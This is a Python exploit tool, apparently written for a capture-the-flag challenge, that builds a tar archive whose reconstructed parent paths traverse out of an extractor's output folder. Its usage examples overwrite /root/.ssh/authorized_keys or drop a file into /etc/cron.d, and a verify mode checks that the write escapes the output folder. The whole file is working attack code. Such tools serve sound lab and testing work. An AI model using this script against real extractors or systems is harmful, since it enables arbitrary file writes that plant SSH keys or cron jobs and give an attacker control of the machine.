#!/usr/bin/env python3
"""Build a tar whose reconstructed parent path traverses out of the output root.

Companion tool for CTFTTE-PWN-010 / CTFTCTE-PWN-010 (archive
hierarchy-reconstruction path traversal). The vulnerable extractor stores each
entry's path, re-parents entries whose parent directory matches a stored node,
and finally joins output + stored-parent-path + name without sanitising it.

Two sibling entries are emitted:

    <prefix><target-dir>/          (directory)
    <prefix><target-dir>/<name>    (regular file, payload bytes)

so the file node's parent holds the traversal prefix and the final join writes
outside the extraction folder.

Usage:
  tar-parent-traversal.py --target /root/.ssh/authorized_keys --payload-file key.pub
  tar-parent-traversal.py --target /etc/cron.d/pwn --payload-file job \
      --prefix ../../.. --output evil.tar --verify

--verify simulates the vulnerable parenting + join logic locally (pure
posixpath, nothing is written) and reports where the file would land relative
to the current directory.
"""
from __future__ import annotations

import argparse
import io
import posixpath
import sys
import tarfile
from pathlib import Path


def build_archive(output: str, prefix: str, target: str, payload: bytes) -> None:
    target_l = target.lstrip("/")
    dir_entry = f"{prefix}{posixpath.dirname(target_l) or '.'}"
    file_entry = f"{prefix}{target_l}"
    with tarfile.open(output, "w") as tf:
        dinfo = tarfile.TarInfo(name=dir_entry)
        dinfo.type = tarfile.DIRTYPE
        dinfo.mode = 0o755
        tf.addfile(dinfo)
        finfo = tarfile.TarInfo(name=file_entry)
        finfo.size = len(payload)
        finfo.mode = 0o600
        tf.addfile(finfo, fileobj=io.BytesIO(payload))
    print(f"entries:\n  dir  {dir_entry}\n  file {file_entry}")


def simulate(output_folder: str, prefix: str, target: str, cwd: str) -> str:
    """Reproduce the flawed parser: parent lookup by stored path, then Join+clean."""
    target_l = target.lstrip("/")
    entries = [
        (f"{prefix}{posixpath.dirname(target_l) or '.'}", True),
        (f"{prefix}{target_l}", False),
    ]
    nodes: dict[str, str] = {}  # stored path -> parent stored path (root is ".")
    for path, _ in entries:
        parent = posixpath.dirname(path) or "."
        nodes[path] = parent if (parent in nodes or parent == ".") else "."
    file_path = entries[-1][0]
    dir_path = posixpath.join(output_folder, nodes[file_path])
    final = posixpath.join(dir_path, posixpath.basename(file_path))
    return posixpath.normpath(posixpath.join(cwd, final))


def main() -> int:
    _doc_lines = (__doc__ or "").strip().splitlines()
    ap = argparse.ArgumentParser(description=_doc_lines[0] if _doc_lines else None)
    ap.add_argument("--target", required=True,
                    help="absolute target file path (e.g. /root/.ssh/authorized_keys)")
    ap.add_argument("--payload-file", required=True,
                    help="file whose contents are written at the target")
    ap.add_argument("--prefix", default="../../../",
                    help="traversal prefix, must absorb the output folder depth "
                         "(default: ../../../)")
    ap.add_argument("--output", default="evil.tar")
    ap.add_argument("--output-folder", default="extracted",
                    help="fixed folder the extractor writes into (default: extracted)")
    ap.add_argument("--verify", action="store_true",
                    help="simulate where the write lands; write nothing")
    args = ap.parse_args()

    payload = Path(args.payload_file).read_bytes()

    if args.verify:
        cwd = "/home/user"  # a generic one-level-deep cwd like a home directory
        lands = simulate(args.output_folder, args.prefix, args.target, cwd)
        ok = lands == args.target
        print(f"simulation (cwd={cwd}, output folder=./{args.output_folder}):")
        print(f"  file would land at: {lands}")
        print(f"  expected target:    {args.target}")
        print("  escape: " + ("yes" if ok else "NO - adjust --prefix"))
        return 0 if ok else 1

    build_archive(args.output, args.prefix, args.target, payload)
    print(f"wrote {args.output} ({len(payload)}-byte payload)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
